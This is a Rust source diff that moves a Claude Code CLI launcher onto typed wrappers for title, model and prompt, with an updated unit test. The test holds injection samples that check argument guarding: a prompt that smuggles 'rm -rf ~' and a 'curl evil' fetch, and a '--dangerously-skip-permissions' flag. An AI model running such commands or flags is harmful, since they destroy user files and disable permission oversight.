@@ -1,5 +1,6 @@
 //! Prepares native Claude Code launches.
 
+use pwf_models::session::{AgentModel, LaunchPrompt, SessionThreadTitle};
 use pwf_wire::task::session::{AgentLaunch, AgentProbe};
 
 use super::argv::LaunchArgv;
@@ -8,10 +9,10 @@ use crate::session::claude_effort::ClaudeEffort;
 const BINARY: &str = "claude";
 
 struct ClaudeLaunchPlan {
-    title: String,
-    model: Option<String>,
+    title: SessionThreadTitle,
+    model: AgentModel,
     effort: ClaudeEffort,
-    prompt: String,
+    prompt: LaunchPrompt,
 }
 
 impl From<&AgentLaunch> for ClaudeLaunchPlan {
@@ -26,7 +27,7 @@ impl From<&AgentLaunch> for ClaudeLaunchPlan {
 }
 
 pub(super) fn probe() -> AgentProbe {
-    super::probe(BINARY)
+    super::probe(pwf_models::session::Agent::Claude, BINARY)
 }
 
 pub(super) fn preview(launch: &AgentLaunch) -> Vec<String> {
@@ -44,18 +45,21 @@ fn prepare_argv(launch: &AgentLaunch) -> Vec<String> {
         effort,
         prompt,
     } = ClaudeLaunchPlan::from(launch);
-    let mut argv = LaunchArgv::new(BINARY).flag("--name", title);
-    if let Some(model) = model {
+    let mut argv = LaunchArgv::new(BINARY).flag("--name", title.to_string());
+    if let Some(model) = model.into_inner() {
         argv = argv.flag("--model", model);
     }
     argv = argv.flag("--effort", effort.as_str().to_string());
-    argv.into_guarded(prompt)
+    argv.into_guarded(prompt.to_string())
 }
 
 #[cfg(test)]
 mod tests {
     use pwf_models::{
-        session::{Agent, SessionEffort},
+        session::{
+            Agent, AgentModel, LaunchPrompt, SessionEffort, SessionThreadTitle,
+            SessionWorkingDirectory,
+        },
         task::TaskId,
     };
     use pwf_wire::task::session::AgentLaunch;
@@ -67,10 +71,12 @@ mod tests {
         let launch = AgentLaunch {
             agent: Agent::Claude,
             task_id: TaskId::try_new("PWF-0038").unwrap(),
-            title: "--dangerously-skip-permissions".to_string(),
-            project_path: "/projects/pwf".to_string(),
-            prompt: "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions".to_string(),
-            model: Some("sonnet".to_string()),
+            title: SessionThreadTitle::new("--dangerously-skip-permissions".to_string()),
+            project_path: SessionWorkingDirectory::new("/projects/pwf".to_string()),
+            prompt: LaunchPrompt::new(
+                "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions".to_string(),
+            ),
+            model: AgentModel::from(Some("sonnet".to_string())),
             effort: SessionEffort::XHigh,
         };
 
